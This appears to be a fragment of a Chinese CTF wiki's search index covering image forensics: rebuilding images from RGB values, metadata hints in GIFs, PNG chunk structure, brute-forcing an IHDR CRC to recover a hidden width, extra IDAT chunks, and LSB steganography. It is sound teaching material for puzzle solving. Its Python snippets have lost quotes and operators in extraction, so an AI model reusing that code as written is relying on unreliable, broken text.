\nline\n\n\n        \nim\n.\nputpixel\n((\ni\n,\nj\n),(\nint\n(\nrgb\n[\n0\n]),\nint\n(\nrgb\n[\n1\n]),\nint\n(\nrgb\n[\n2\n])))\n#rgb\u8f6c\u5316\u4e3a\u50cf\u7d20\n\n\nim\n.\nshow\n()\n\n\nim\n.\nsave\n(\nflag.png\n)\n\n\n\n\n\n\u800c\u5982\u679c\u53cd\u8fc7\u6765\u7684\u8bdd\uff0c\u4ece\u4e00\u5f20\u56fe\u7247\u63d0\u53d6 RGB \u503c\uff0c\u518d\u5bf9 RGB \u503c\u53bb\u8fdb\u884c\u4e00\u4e9b\u5bf9\u6bd4\uff0c\u4ece\u800c\u5f97\u5230\u6700\u7ec8\u7684 flag\u3002\n\n\n\u8fd9\u7c7b\u9898\u76ee\u5927\u90e8\u5206\u90fd\u662f\u4e00\u4e9b\u50cf\u7d20\u5757\u7ec4\u6210\u7684\u56fe\u7247\uff0c\u5982\u4e0b\u56fe\n\n\n\n\n\u76f8\u5173\u9898\u76ee:\n\n\n\n\nCSAW-2016-quals:Forensic/Barinfun\n\n\nbreakin-ctf-2017:A-dance-partner", 
            "title": "\u56fe\u7247\u5206\u6790\u7b80\u4ecb"
        }, 
        {
            "location": "/misc/picture/introduction/#metadata", 
            "text": "\u5143\u6570\u636e\uff08Metadata\uff09\uff0c\u53c8\u79f0\u4e2d\u4ecb\u6570\u636e\u3001\u4e2d\u7ee7\u6570\u636e\uff0c\u4e3a\u63cf\u8ff0\u6570\u636e\u7684\u6570\u636e\uff08Data about data\uff09\uff0c\u4e3b\u8981\u662f\u63cf\u8ff0\u6570\u636e\u5c5e\u6027\uff08property\uff09\u7684\u4fe1\u606f\uff0c\u7528\u6765\u652f\u6301\u5982\u6307\u793a\u5b58\u50a8\u4f4d\u7f6e\u3001\u5386\u53f2\u6570\u636e\u3001\u8d44\u6e90\u67e5\u627e\u3001\u6587\u4ef6\u8bb0\u5f55\u7b49\u529f\u80fd\u3002   \u5143\u6570\u636e\u4e2d\u9690\u85cf\u4fe1\u606f\u5728\u6bd4\u8d5b\u4e2d\u662f\u6700\u57fa\u672c\u7684\u4e00\u79cd\u624b\u6cd5\uff0c\u901a\u5e38\u7528\u6765\u9690\u85cf\u4e00\u4e9b\u5173\u952e\u7684  Hint  \u4fe1\u606f\u6216\u8005\u662f\u4e00\u4e9b\u91cd\u8981\u7684\u5982  password  \u7b49\u4fe1\u606f\u3002  \u8fd9\u7c7b\u5143\u6570\u636e\u4f60\u53ef\u4ee5  \u53f3\u952e --  \u5c5e\u6027  \u53bb\u67e5\u770b,\u4e5f\u53ef\u4ee5\u901a\u8fc7  strings  \u547d\u4ee4\u53bb\u67e5\u770b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e9b\u9690\u85cf\u7684\u4fe1\u606f\uff08\u5947\u602a\u7684\u5b57\u7b26\u4e32\uff09\u5e38\u5e38\u51fa\u73b0\u5728\u5934\u90e8\u6216\u8005\u5c3e\u90e8\u3002  \u63a5\u4e0b\u6765\u4ecb\u7ecd\u4e00\u4e2a  identify  \u547d\u4ee4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u662f\u7528\u6765\u83b7\u53d6\u4e00\u4e2a\u6216\u591a\u4e2a\u56fe\u50cf\u6587\u4ef6\u7684\u683c\u5f0f\u548c\u7279\u6027\u3002  -format  \u7528\u6765\u6307\u5b9a\u663e\u793a\u7684\u4fe1\u606f\uff0c\u7075\u6d3b\u4f7f\u7528\u5b83\u7684  -format  \u53c2\u6570\u53ef\u4ee5\u7ed9\u89e3\u9898\u5e26\u6765\u4e0d\u5c11\u65b9\u4fbf\u3002 format\u5404\u4e2a\u53c2\u6570\u5177\u4f53\u610f\u4e49", 
            "title": "\u5143\u6570\u636e\uff08Metadata\uff09"
        }, 
        {
            "location": "/misc/picture/introduction/#_1", 
            "text": "Break In 2017 - Mysterious GIF  \u8fd9\u9898\u7684\u4e00\u4e2a\u96be\u70b9\u662f\u53d1\u73b0\u5e76\u63d0\u53d6 GIF \u4e2d\u7684\u5143\u6570\u636e\uff0c\u9996\u5148  strings  \u662f\u53ef\u4ee5\u89c2\u5bdf\u5230\u5f02\u5e38\u70b9\u7684\u3002  GIF89a\n   !!! ### $$ $ %%% ((()))***+++,,,---...///000111222333444555666777888999:::;;; === ???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz{{{|||}}}~~~  4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172  NETSCAPE2.0  ImageMagick  ...   \u8fd9\u91cc\u7684\u4e00\u4e3216\u8fdb\u5236\u5176\u5b9e\u662f\u85cf\u5728 GIF \u7684\u5143\u6570\u636e\u533a  \u63a5\u4e0b\u6765\u5c31\u662f\u63d0\u53d6\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9 Python\uff0c\u4f46\u662f\u5229\u7528  identify  \u663e\u5f97\u66f4\u52a0\u4fbf\u6377  root in ~/Desktop/tmp \u03bb identify -format  %s %c \\n  Question.gif 0  4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 1  5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271\n... 24  484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f 25  724b3052485a6b745062457335797444737142486435504646773d3d  \u5176\u4ed6\u8fc7\u7a0b\u8fd9\u91cc\u4e0d\u5728\u53d9\u8ff0\uff0c\u53ef\u53c2\u8003\u94fe\u63a5\u4e2d\u7684 Writeup", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/misc/picture/introduction/#_2", 
            "text": "\u770b\u770b\u8fd9\u4e2a\u6587\u4ef6\u91cc\u7684\u6570\u636e\uff0c\u4f60\u80fd\u60f3\u5230\u4ec0\u4e48\uff1f  255,255,255,255,255...........  \u662f\u4e00\u4e32 RGB \u503c\uff0c\u5c1d\u8bd5\u7740\u5c06\u4ed6\u8f6c\u5316\u4e3a\u56fe\u7247  from   PIL   import   Image  import   re  x   =   307   #x\u5750\u6807  \u901a\u8fc7\u5bf9txt\u91cc\u7684\u884c\u6570\u8fdb\u884c\u6574\u6570\u5206\u89e3  y   =   311   #y\u5750\u6807  x*y = \u884c\u6570  rgb1   =   [ **** ]  print   len ( rgb1 ) / 3  m = 0  for   i   in   xrange ( 0 , x ): \n     for   j   in   xrange ( 0 , y ): \n\n         line   =   rgb1 [( 3 * m ):( 3 * ( m + 1 ))] #\u83b7\u53d6\u4e00\u884c \n         m += 1 \n         rgb   =   line \n\n         im . putpixel (( i , j ),( int ( rgb [ 0 ]), int ( rgb [ 1 ]), int ( rgb [ 2 ]))) #rgb\u8f6c\u5316\u4e3a\u50cf\u7d20  im . show ()  im . save ( flag.png )   \u800c\u5982\u679c\u53cd\u8fc7\u6765\u7684\u8bdd\uff0c\u4ece\u4e00\u5f20\u56fe\u7247\u63d0\u53d6 RGB \u503c\uff0c\u518d\u5bf9 RGB \u503c\u53bb\u8fdb\u884c\u4e00\u4e9b\u5bf9\u6bd4\uff0c\u4ece\u800c\u5f97\u5230\u6700\u7ec8\u7684 flag\u3002  \u8fd9\u7c7b\u9898\u76ee\u5927\u90e8\u5206\u90fd\u662f\u4e00\u4e9b\u50cf\u7d20\u5757\u7ec4\u6210\u7684\u56fe\u7247\uff0c\u5982\u4e0b\u56fe   \u76f8\u5173\u9898\u76ee:   CSAW-2016-quals:Forensic/Barinfun  breakin-ctf-2017:A-dance-partner", 
            "title": "\u50cf\u7d20\u503c\u8f6c\u5316"
        }, 
        {
            "location": "/misc/picture/png/", 
            "text": "\u6587\u4ef6\u683c\u5f0f\n\n\n\u5bf9\u4e8e\u4e00\u4e2a PNG \u6587\u4ef6\u6765\u8bf4\uff0c\u5176\u6587\u4ef6\u5934\u603b\u662f\u7531\u4f4d\u56fa\u5b9a\u7684\u5b57\u8282\u6765\u63cf\u8ff0\u7684\uff0c\u5269\u4f59\u7684\u90e8\u5206\u7531 3 \u4e2a\u4ee5\u4e0a\u7684 PNG \u7684\u6570\u636e\u5757\uff08Chunk\uff09\u6309\u7167\u7279\u5b9a\u7684\u987a\u5e8f\u7ec4\u6210\u3002\n\n\n\u6587\u4ef6\u5934 \n89 50 4E 47 0D 0A 1A 0A\n + \u6570\u636e\u5757 + \u6570\u636e\u5757 + \u6570\u636e\u5757\u2026\u2026\n\n\n\u6570\u636e\u5757CHUNk\n\n\nPNG \u5b9a\u4e49\u4e86\u4e24\u79cd\u7c7b\u578b\u7684\u6570\u636e\u5757\uff0c\u4e00\u79cd\u662f\u79f0\u4e3a\u5173\u952e\u6570\u636e\u5757\uff08critical chunk\uff09\uff0c\u8fd9\u662f\u6807\u51c6\u7684\u6570\u636e\u5757\uff0c\u53e6\u4e00\u79cd\u53eb\u505a\u8f85\u52a9\u6570\u636e\u5757\uff08ancillary chunks\uff09\uff0c\u8fd9\u662f\u53ef\u9009\u7684\u6570\u636e\u5757\u3002\u5173\u952e\u6570\u636e\u5757\u5b9a\u4e49\u4e86 4 \u4e2a\u6807\u51c6\u6570\u636e\u5757\uff0c\u6bcf\u4e2a PNG \u6587\u4ef6\u90fd\u5fc5\u987b\u5305\u542b\u5b83\u4eec\uff0cPNG \u8bfb\u5199\u8f6f\u4ef6\u4e5f\u90fd\u5fc5\u987b\u8981\u652f\u6301\u8fd9\u4e9b\u6570\u636e\u5757\u3002\n\n\n\n\n\n\n\n\n\u6570\u636e\u5757\u7b26\u53f7\n\n\n\u6570\u636e\u5757\u540d\u79f0\n\n\n\u591a\u6570\u636e\u5757\n\n\n\u53ef\u9009\u5426\n\n\n\u4f4d\u7f6e\u9650\u5236\n\n\n\n\n\n\n\n\n\n\nIHDR\n\n\n\u6587\u4ef6\u5934\u6570\u636e\u5757\n\n\n\u5426\n\n\n\u5426\n\n\n\u7b2c\u4e00\u5757\n\n\n\n\n\n\ncHRM\n\n\n\u57fa\u8272\u548c\u767d\u8272\u70b9\u6570\u636e\u5757\n\n\n\u5426\n\n\n\u662f\n\n\n\u5728PLTE\u548cIDAT\u4e4b\u524d\n\n\n\n\n\n\ngAMA\n\n\n\u56fe\u50cf\u03b3\u6570\u636e\u5757\n\n\n\u5426\n\n\n\u662f\n\n\n\u5728PLTE\u548cIDAT\u4e4b\u524d\n\n\n\n\n\n\nsBIT\n\n\n\u6837\u672c\u6709\u6548\u4f4d\u6570\u636e\u5757\n\n\n\u5426\n\n\n\u662f\n\n\n\u5728PLTE\u548cIDAT\u4e4b\u524d\n\n\n\n\n\n\nPLTE\n\n\n\u8c03\u8272\u677f\u6570\u636e\u5757\n\n\n\u5426\n\n\n\u662f\n\n\n\u5728IDAT\u4e4b\u524d\n\n\n\n\n\n\nbKGD\n\n\n\u80cc\u666f\u989c\u8272\u6570\u636e\u5757\n\n\n\u5426\n\n\n\u662f\n\n\n\u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d\n\n\n\n\n\n\nhIST\n\n\n\u56fe\u50cf\u76f4\u65b9\u56fe\u6570\u636e\u5757\n\n\n\u5426\n\n\n\u662f\n\n\n\u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d\n\n\n\n\n\n\ntRNS\n\n\n\u56fe\u50cf\u900f\u660e\u6570\u636e\u5757\n\n\n\u5426\n\n\n\u662f\n\n\n\u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d\n\n\n\n\n\n\noFFs\n\n\n(\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09\n\n\n\u5426\n\n\n\u662f\n\n\n\u5728IDAT\u4e4b\u524d\n\n\n\n\n\n\npHYs\n\n\n\u7269\u7406\u50cf\u7d20\u5c3a\u5bf8\u6570\u636e\u5757\n\n\n\u5426\n\n\n\u662f\n\n\n\u5728IDAT\u4e4b\u524d\n\n\n\n\n\n\nsCAL\n\n\n(\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09\n\n\n\u5426\n\n\n\u662f\n\n\n\u5728IDAT\u4e4b\u524d\n\n\n\n\n\n\nIDAT\n\n\n\u56fe\u50cf\u6570\u636e\u5757\n\n\n\u662f\n\n\n\u5426\n\n\n\u4e0e\u5176\u4ed6IDAT\u8fde\u7eed\n\n\n\n\n\n\ntIME\n\n\n\u56fe\u50cf\u6700\u540e\u4fee\u6539\u65f6\u95f4\u6570\u636e\u5757\n\n\n\u5426\n\n\n\u662f\n\n\n\u65e0\u9650\u5236\n\n\n\n\n\n\ntEXt\n\n\n\u6587\u672c\u4fe1\u606f\u6570\u636e\u5757\n\n\n\u662f\n\n\n\u662f\n\n\n\u65e0\u9650\u5236\n\n\n\n\n\n\nzTXt\n\n\n\u538b\u7f29\u6587\u672c\u6570\u636e\u5757\n\n\n\u662f\n\n\n\u662f\n\n\n\u65e0\u9650\u5236\n\n\n\n\n\n\nfRAc\n\n\n(\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09\n\n\n\u662f\n\n\n\u662f\n\n\n\u65e0\u9650\u5236\n\n\n\n\n\n\ngIFg\n\n\n(\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09\n\n\n\u662f\n\n\n\u662f\n\n\n\u65e0\u9650\u5236\n\n\n\n\n\n\ngIFt\n\n\n(\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09\n\n\n\u662f\n\n\n\u662f\n\n\n\u65e0\u9650\u5236\n\n\n\n\n\n\ngIFx\n\n\n(\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09\n\n\n\u662f\n\n\n\u662f\n\n\n\u65e0\u9650\u5236\n\n\n\n\n\n\nIEND\n\n\n\u56fe\u50cf\u7ed3\u675f\u6570\u636e\n\n\n\u5426\n\n\n\u5426\n\n\n\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757\n\n\n\n\n\n\n\n\n\u5bf9\u4e8e\u6bcf\u4e2a\u6570\u636e\u5757\u90fd\u6709\u7740\u7edf\u4e00\u7684\u6570\u636e\u7ed3\u6784\uff0c\u6bcf\u4e2a\u6570\u636e\u5757\u7531 4 \u4e2a\u90e8\u5206\u7ec4\u6210\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u5b57\u8282\u6570\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nLength\uff08\u957f\u5ea6\uff09\n\n\n4\u5b57\u8282\n\n\n\u6307\u5b9a\u6570\u636e\u5757\u4e2d\u6570\u636e\u57df\u7684\u957f\u5ea6\uff0c\u5176\u957f\u5ea6\u4e0d\u8d85\u8fc7\uff08231\uff0d1\uff09\u5b57\u8282\n\n\n\n\n\n\nChunk Type Code\uff08\u6570\u636e\u5757\u7c7b\u578b\u7801\uff09\n\n\n4\u5b57\u8282\n\n\n\u6570\u636e\u5757\u7c7b\u578b\u7801\u7531 ASCII \u5b57\u6bcd\uff08A - Z \u548c a - z\uff09\u7ec4\u6210\n\n\n\n\n\n\nChunk Data\uff08\u6570\u636e\u5757\u6570\u636e\uff09\n\n\n\u53ef\u53d8\u957f\u5ea6\n\n\n\u5b58\u50a8\u6309\u7167 Chunk Type Code \u6307\u5b9a\u7684\u6570\u636e\n\n\n\n\n\n\nCRC\uff08\u5faa\u73af\u5197\u4f59\u68c0\u6d4b\uff09\n\n\n4\u5b57\u8282\n\n\n\u5b58\u50a8\u7528\u6765\u68c0\u6d4b\u662f\u5426\u6709\u9519\u8bef\u7684\u5faa\u73af\u5197\u4f59\u7801\n\n\n\n\n\n\n\n\nCRC\uff08Cyclic Redundancy Check\uff09\u57df\u4e2d\u7684\u503c\u662f\u5bf9 Chunk Type Code \u57df\u548c Chunk Data \u57df\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u8ba1\u7b97\u5f97\u5230\u7684\u3002\n\n\nIHDR\n\n\n\u6587\u4ef6\u5934\u6570\u636e\u5757 IHDR\uff08Header Chunk\uff09\uff1a\u5b83\u5305\u542b\u6709 PNG \u6587\u4ef6\u4e2d\u5b58\u50a8\u7684\u56fe\u50cf\u6570\u636e\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u7531 13 \u5b57\u8282\u7ec4\u6210\uff0c\u5e76\u8981\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u6570\u636e\u5757\u51fa\u73b0\u5728 PNG \u6570\u636e\u6d41\u4e2d\uff0c\u800c\u4e14\u4e00\u4e2a PNG \u6570\u636e\u6d41\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a\u6587\u4ef6\u5934\u6570\u636e\u5757\n\n\n\u5176\u4e2d\u6211\u4eec\u5173\u6ce8\u7684\u662f\u524d8\u5b57\u8282\u7684\u5185\u5bb9\n\n\n\n\n\n\n\n\n\u57df\u7684\u540d\u79f0\n\n\n\u5b57\u8282\u6570\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nWidth\n\n\n4 bytes\n\n\n\u56fe\u50cf\u5bbd\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\n\n\n\n\n\n\nHeight\n\n\n4 bytes\n\n\n\u56fe\u50cf\u9ad8\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d\n\n\n\n\n\n\n\n\n\u6211\u4eec\u7ecf\u5e38\u4f1a\u53bb\u66f4\u6539\u4e00\u5f20\u56fe\u7247\u7684\u9ad8\u5ea6\u6216\u8005\u5bbd\u5ea6\u4f7f\u5f97\u4e00\u5f20\u56fe\u7247\u663e\u793a\u4e0d\u5b8c\u6574\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u4fe1\u606f\u7684\u76ee\u7684\u3002\n\n\n\n\n\u8fd9\u91cc\u53ef\u4ee5\u53d1\u73b0\u5728 Kali \u4e2d\u662f\u6253\u4e0d\u5f00\u8fd9\u5f20\u56fe\u7247\u7684\uff0c\u63d0\u793a \nIHDR CRC error\n\uff0c\u800c Windows 10 \u81ea\u5e26\u7684\u56fe\u7247\u67e5\u770b\u5668\u80fd\u591f\u6253\u5f00\uff0c\u5c31\u63d0\u9192\u4e86\u6211\u4eec IHDR \u5757\u88ab\u4eba\u4e3a\u7684\u7be1\u6539\u8fc7\u4e86\uff0c\u4ece\u800c\u5c1d\u8bd5\u4fee\u6539\u56fe\u7247\u7684\u9ad8\u5ea6\u6216\u8005\u5bbd\u5ea6\u53d1\u73b0\u9690\u85cf\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\u4f8b\u9898\n\n\nWDCTF-finals-2017\n\n\n\u89c2\u5bdf\u6587\u4ef6\u53ef\u4ee5\u53d1\u73b0,\u6587\u4ef6\u5934\u53ca\u5bbd\u5ea6\u5f02\u5e38\n\n\n00000000  80 59 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.YNG........IHDR|\n00000010  00 00 00 00 00 00 02 f8  08 06 00 00 00 93 2f 8a  |............../.|\n00000020  6b 00 00 00 04 67 41 4d  41 00 00 9c 40 20 0d e4  |k....gAMA...@ ..|\n00000030  cb 00 00 00 20 63 48 52  4d 00 00 87 0f 00 00 8c  |.... cHRM.......|\n00000040  0f 00 00 fd 52 00 00 81  40 00 00 7d 79 00 00 e9  |....R...@..}y...|\n...\n\n\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6587\u4ef6\u5bbd\u5ea6\u4e0d\u80fd\u4efb\u610f\u4fee\u6539\uff0c\u9700\u8981\u6839\u636e IHDR \u5757\u7684 CRC \u503c\u7206\u7834\u5f97\u5230\u5bbd\u5ea6,\u5426\u5219\u56fe\u7247\u663e\u793a\u9519\u8bef\u4e0d\u80fd\u5f97\u5230 flag\u3002\n\n\nimport\n \nos\n\n\nimport\n \nbinascii\n\n\nimport\n \nstruct\n\n\n\n\nmisc\n \n=\n \nopen\n(\nmisc4.png\n,\nrb\n)\n.\nread\n()\n\n\n\nfor\n \ni\n \nin\n \nrange\n(\n1024\n):\n\n    \ndata\n \n=\n \nmisc\n[\n12\n:\n16\n]\n \n+\n \nstruct\n.\npack\n(\ni\n,\ni\n)\n+\n \nmisc\n[\n20\n:\n29\n]\n\n    \ncrc32\n \n=\n \nbinascii\n.\ncrc32\n(\ndata\n)\n \n \n0xffffffff\n\n    \nif\n \ncrc32\n \n==\n \n0x932f8a6b\n:\n\n        \nprint\n \ni\n\n\n\n\n\n\u5f97\u5230\u5bbd\u5ea6\u503c\u4e3a 709 \u540e\uff0c\u6062\u590d\u56fe\u7247\u5f97\u5230 flag\u3002\n\n\n\n\nPLTE\n\n\n\u8c03\u8272\u677f\u6570\u636e\u5757 PLTE\uff08palette chunk\uff09\uff1a\u5b83\u5305\u542b\u6709\u4e0e\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\uff08indexed-color image\uff09\u76f8\u5173\u7684\u5f69\u8272\u53d8\u6362\u6570\u636e\uff0c\u5b83\u4ec5\u4e0e\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\u6709\u5173\uff0c\u800c\u4e14\u8981\u653e\u5728\u56fe\u50cf\u6570\u636e\u5757\uff08image data\nchunk\uff09\u4e4b\u524d\u3002\u771f\u5f69\u8272\u7684 PNG \u6570\u636e\u6d41\u4e5f\u53ef\u4ee5\u6709\u8c03\u8272\u677f\u6570\u636e\u5757\uff0c\u76ee\u7684\u662f\u4fbf\u4e8e\u975e\u771f\u5f69\u8272\u663e\u793a\u7a0b\u5e8f\u7528\u5b83\u6765\u91cf\u5316\u56fe\u50cf\u6570\u636e\uff0c\u4ece\u800c\u663e\u793a\u8be5\u56fe\u50cf\u3002\n\n\nIDAT\n\n\n\u56fe\u50cf\u6570\u636e\u5757 IDAT\uff08image data chunk\uff09\uff1a\u5b83\u5b58\u50a8\u5b9e\u9645\u7684\u6570\u636e\uff0c\u5728\u6570\u636e\u6d41\u4e2d\u53ef\u5305\u542b\u591a\u4e2a\u8fde\u7eed\u987a\u5e8f\u7684\u56fe\u50cf\u6570\u636e\u5757\u3002\n\n\n\n\n\u50a8\u5b58\u56fe\u50cf\u50cf\u6570\u6570\u636e\n\n\n\u5728\u6570\u636e\u6d41\u4e2d\u53ef\u5305\u542b\u591a\u4e2a\u8fde\u7eed\u987a\u5e8f\u7684\u56fe\u50cf\u6570\u636e\u5757\n\n\n\u91c7\u7528 LZ77 \u7b97\u6cd5\u7684\u6d3e\u751f\u7b97\u6cd5\u8fdb\u884c\u538b\u7f29\n\n\n\u53ef\u4ee5\u7528 zlib \u89e3\u538b\u7f29\n\n\n\n\n\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cIDAT \u5757\u53ea\u6709\u5f53\u4e0a\u4e00\u4e2a\u5757\u5145\u6ee1\u65f6\uff0c\u624d\u4f1a\u7ee7\u7eed\u4e00\u4e2a\u65b0\u7684\u5757\u3002\n\n\n\u7528 \npngcheck\n \u53bb\u67e5\u770b\u6b64 PNG \u6587\u4ef6\n\n\n\u03bb .\n\\p\nngcheck.exe -v sctf.png\nFile: sctf.png \n(\n1421461\n bytes\n)\n\n  chunk IHDR at offset 0x0000c, length \n13\n\n    \n1000\n x \n562\n image, \n32\n-bit RGB+alpha, non-interlaced\n  chunk sRGB at offset 0x00025, length \n1\n\n    rendering \nintent\n \n=\n perceptual\n  chunk gAMA at offset 0x00032, length \n4\n: \n0\n.45455\n  chunk pHYs at offset 0x00042, length \n9\n: 3780x3780 pixels/meter \n(\n96\n dpi\n)\n\n  chunk IDAT at offset 0x00057, length \n65445\n\n    zlib: deflated, 32K window, fast compression\n  chunk IDAT at offset 0x10008, length \n65524\n\n...\n  chunk IDAT at offset 0x150008, length \n45027\n\n  chunk IDAT at offset 0x15aff7, length \n138\n\n  chunk IEND at offset 0x15b08d, length \n0\n\nNo errors detected in sctf.png \n(\n28\n chunks, \n36\n.8% compression\n)\n.\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\uff0c\u6b63\u5e38\u7684\u5757\u7684 length \u662f\u5728 65524 \u7684\u65f6\u5019\u5c31\u6ee1\u4e86\uff0c\u800c\u5012\u6570\u7b2c\u4e8c\u4e2a IDAT \u5757\u957f\u5ea6\u662f 45027\uff0c\u6700\u540e\u4e00\u4e2a\u957f\u5ea6\u662f 138\uff0c\u5f88\u660e\u663e\u6700\u540e\u4e00\u4e2a IDAT \u5757\u662f\u6709\u95ee\u9898\u7684\uff0c\u56e0\u4e3a\u4ed6\u672c\u6765\u5e94\u8be5\u5e76\u5165\u5230\u5012\u6570\u7b2c\u4e8c\u4e2a\u672a\u6ee1\u7684\u5757\u91cc.\n\n\n\u5229\u7528 \npython zlib\n \u89e3\u538b\u591a\u4f59 IDAT \u5757\u7684\u5185\u5bb9\uff0c\u6b64\u65f6\u6ce8\u610f\u5254\u9664 \n\u957f\u5ea6\u3001\u6570\u636e\u5757\u7c7b\u578b\u53ca\u672b\u5c3e\u7684CRC\u6821\u9a8c\u503c\n\u3002\n\n\nimport\n \nzlib\n\n\nimport\n \nbinascii\n\n\nIDAT\n \n=\n \n789...667\n.\ndecode\n(\nhex\n)\n\n\nresult\n \n=\n \nbinascii\n.\nhexlify\n(\nzlib\n.\ndecompress\n(\nIDAT\n))\n\n\nprint\n \nresult\n\n\n\n\n\nIEND\n\n\n\u56fe\u50cf\u7ed3\u675f\u6570\u636e IEND\uff08image trailer chunk\uff09\uff1a\u5b83\u7528\u6765\u6807\u8bb0 PNG \u6587\u4ef6\u6216\u8005\u6570\u636e\u6d41\u5df2\u7ecf\u7ed3\u675f\uff0c\u5e76\u4e14\u5fc5\u987b\u8981\u653e\u5728\u6587\u4ef6\u7684\u5c3e\u90e8\u3002\n\n\n00 00 00 00 49 45 4E 44 AE 42 60 82\n\n\n\n\nIEND \u6570\u636e\u5757\u7684\u957f\u5ea6\u603b\u662f \n00 00 00 00\n\uff0c\u6570\u636e\u6807\u8bc6\u603b\u662f IEND \n49 45 4E 44\n\uff0c\u56e0\u6b64\uff0cCRC \u7801\u4e5f\u603b\u662f \nAE 42 60 82\n\u3002\n\n\n\u5176\u4f59\u8f85\u52a9\u6570\u636e\u5757\n\n\n\n\n\u80cc\u666f\u989c\u8272\u6570\u636e\u5757 bKGD\uff08background color\uff09\n\n\n\u57fa\u8272\u548c\u767d\u8272\u5ea6\u6570\u636e\u5757 cHRM\uff08primary chromaticities and white point\uff09\uff0c\u6240\u8c13\u767d\u8272\u5ea6\u662f\u6307\u5f53 \nR\uff1dG\uff1dB\uff1d\u6700\u5927\u503c\n \u65f6\u5728\u663e\u793a\u5668\u4e0a\u4ea7\u751f\u7684\u767d\u8272\u5ea6\n\n\n\u56fe\u50cf \u03b3 \u6570\u636e\u5757 gAMA\uff08image gamma\uff09\n\n\n\u56fe\u50cf\u76f4\u65b9\u56fe\u6570\u636e\u5757 hIST\uff08image histogram\uff09\n\n\n\u7269\u7406\u50cf\u7d20\u5c3a\u5bf8\u6570\u636e\u5757 pHYs\uff08physical pixel dimensions\uff09\n\n\n\u6837\u672c\u6709\u6548\u4f4d\u6570\u636e\u5757 sBIT\uff08significant bits\uff09\n\n\n\u6587\u672c\u4fe1\u606f\u6570\u636e\u5757 tEXt\uff08textual data\uff09\n\n\n\u56fe\u50cf\u6700\u540e\u4fee\u6539\u65f6\u95f4\u6570\u636e\u5757 tIME \uff08image last-modification time\uff09\n\n\n\u56fe\u50cf\u900f\u660e\u6570\u636e\u5757 tRNS \uff08transparency\uff09\n\n\n\u538b\u7f29\u6587\u672c\u6570\u636e\u5757 zTXt \uff08compressed textual data\uff09\n\n\n\n\nLSB\n\n\nLSB \u5168\u79f0 Least Significant Bit\uff0c\u6700\u4f4e\u6709\u6548\u4f4d\u3002PNG \u6587\u4ef6\u4e2d\u7684\u56fe\u50cf\u50cf\u6570\u4e00\u822c\u662f\u7531 RGB \u4e09\u539f\u8272\uff08\u7ea2\u7eff\u84dd\uff09\u7ec4\u6210\uff0c\u6bcf\u4e00\u79cd\u989c\u8272\u5360\u7528 8 \u4f4d\uff0c\u53d6\u503c\u8303\u56f4\u4e3a \n0x00\n \u81f3 \n0xFF\n\uff0c\u5373\u6709 256 \u79cd\u989c\u8272\uff0c\u4e00\u5171\u5305\u542b\u4e86 256 \u7684 3 \u6b21\u65b9\u7684\u989c\u8272\uff0c\u5373 16777216 \u79cd\u989c\u8272\u3002\n\n\n\u800c\u4eba\u7c7b\u7684\u773c\u775b\u53ef\u4ee5\u533a\u5206\u7ea61000\u4e07\u79cd\u4e0d\u540c\u7684\u989c\u8272\uff0c\u610f\u5473\u7740\u4eba\u7c7b\u7684\u773c\u775b\u65e0\u6cd5\u533a\u5206\u4f59\u4e0b\u7684\u989c\u8272\u5927\u7ea6\u67096777216\u79cd\u3002\n\n\nLSB \u9690\u5199\u5c31\u662f\u4fee\u6539 RGB \u989c\u8272\u5206\u91cf\u7684\u6700\u4f4e\u4e8c\u8fdb\u5236\u4f4d\uff08LSB\uff09\uff0c\u6bcf\u4e2a\u989c\u8272\u4f1a\u6709 8 bit\uff0cLSB \u9690\u5199\u5c31\u662f\u4fee\u6539\u4e86\u50cf\u6570\u4e2d\u7684\u6700\u4f4e\u7684 1 bit\uff0c\u800c\u4eba\u7c7b\u7684\u773c\u775b\u4e0d\u4f1a\u6ce8\u610f\u5230\u8fd9\u524d\u540e\u7684\u53d8\u5316\uff0c\u6bcf\u4e2a\u50cf\u7d20\u53ef\u4ee5\u643a\u5e26 3 